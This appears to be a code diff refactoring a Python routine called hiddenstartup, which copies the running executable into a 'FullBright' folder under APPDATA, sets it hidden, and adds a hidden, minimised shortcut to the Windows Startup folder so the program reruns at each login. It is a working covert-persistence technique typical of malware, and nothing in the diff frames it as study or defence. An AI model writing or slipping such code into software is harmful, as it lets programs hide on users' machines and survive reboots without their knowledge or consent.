@@ -1,18 +1,22 @@
-import os, sys, shutil, win32com.client
+import os, sys, shutil, ctypes, pythoncom
+from pathlib import Path
+from win32com.client import Dispatch
 def hiddenstartup():
+    pythoncom.CoInitialize()
     appdata = os.getenv('APPDATA')
-    target_folder = os.path.join(appdata, 'FullBright')
-    os.makedirs(target_folder, exist_ok=True)
+    target_folder = Path(appdata) / 'FullBright'
+    target_folder.mkdir(parents=True, exist_ok=True)
+    target_exe = target_folder / Path(sys.executable).name
+    if target_exe.exists(): target_exe.unlink()
     shutil.copy(sys.executable, target_folder)
-    os.system(f'attrib +h "{os.path.join(target_folder, os.path.basename(sys.executable))}"')
-
-    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    shortcut = os.path.join(startup, 'FullBright.lnk')
-    shell = win32com.client.Dispatch('WScript.Shell')
-    shortcut_obj = shell.CreateShortcut(shortcut)
-    shortcut_obj.TargetPath = os.path.join(target_folder, os.path.basename(sys.executable))
-    shortcut_obj.IconLocation = os.path.join(target_folder, os.path.basename(sys.executable))
+    ctypes.windll.kernel32.SetFileAttributesW(str(target_exe), 0x2)
+    startup = Path(appdata) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
+    shortcut = startup / 'FullBright.lnk'
+    shell = Dispatch('WScript.Shell')
+    shortcut_obj = shell.CreateShortcut(str(shortcut))
+    shortcut_obj.TargetPath = str(target_exe)
+    shortcut_obj.IconLocation = str(target_exe)
     shortcut_obj.WindowStyle = 7
     shortcut_obj.Save()
-    os.system(f'attrib +h "{shortcut}"')
-hiddenstartup()
+    ctypes.windll.kernel32.SetFileAttributesW(str(shortcut), 0x2)
+    pythoncom.CoUninitialize()
